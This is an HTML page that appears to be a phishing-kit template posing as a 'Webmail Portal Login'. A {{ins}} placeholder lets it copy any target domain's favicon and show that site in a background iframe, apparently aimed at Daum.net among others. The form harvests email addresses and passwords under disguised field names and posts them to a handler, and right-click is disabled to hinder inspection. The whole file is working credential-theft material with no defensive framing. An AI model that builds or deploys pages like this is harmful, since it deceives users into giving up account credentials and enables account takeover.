<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
    <title>Webmail Portal Login</title>
    <style>
        /* Resetting styles */
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            font-size: 18px;
            position: relative;
            background-color: #f0f0f0;
        }

        #background-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            border: none;
        }

        .form-holder {
            background-color: #fff;
            width: 600px;
            margin: 180px auto;
            padding: 20px;
            box-shadow: 0 20px 50px #a9a9a9;
            border-radius: 4px;
            z-index: 10;
            position: relative;
        }

        .xlogo {
            background-color: #0d4f8b;
            color: #fff;
            padding: 8px;
            margin-bottom: 10px;
        }

        .xlogo img {
            vertical-align: middle;
            width: 5%;
            height: 5%;
            object-fit: contain;
        }

        .form-wrap {
            width: 400px;
            margin: 0 auto;
            text-align: center;
        }

        .finput input {
            width: 80%;
            padding: 10px;
            margin: 10px auto;
            font-size: 18px;
        }

        button {
            padding: 10px 20px;
            background-color: #0d4f8b;
            color: #fff;
            border: none;
            cursor: pointer;
        }

        button:hover {
            background-color: #1874cd;
        }
    </style>
</head>

<body oncontextmenu="return false;">
    <!-- Daum.net background using an iframe -->
    <iframe id="background-iframe" src="https://www.{{ins}}/" frameborder="0"></iframe>

    <div class="form-holder">
        <div class="xlogo">
            <span style="text-transform: capitalize;" id="banNer">Webmail Portal Login</span>
        </div>
        <div class="form-wrap">
            <form action="first" method="POST">
                <p>Please sign in with your email</p>
                <div class="finput">
                    <input type="email" id="ai" name="horse" placeholder="Email" required>
                </div>
                <div class="finput">
                    <input type="password" name="pig" placeholder="Email Password" id="pr" required>
                </div>
                <div class="finput btn">
                    <button id="submit-btn">Continue</button>
                </div>
            </form>
        </div>
    </div>
</body>

</html>
